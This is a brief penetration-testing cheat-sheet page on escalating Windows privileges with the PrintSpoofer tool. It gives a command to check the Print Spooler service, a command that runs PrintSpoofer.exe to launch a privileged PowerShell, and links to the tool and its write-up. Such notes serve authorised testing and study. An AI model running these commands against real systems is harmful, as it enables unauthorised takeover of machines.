---
description: Escalating privileges with PrintSpoofer
---

# PrintSpoofer

### Exploitation

```bash
# Verify that the Print Spooler service is running
Get-Service Spooler

# Run the PrintSpoofer executable to escalate privileges
.\PrintSpoofer.exe -i -c powershell
```

### References

{% embed url="https://github.com/itm4n/PrintSpoofer" %}

{% embed url="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" %}
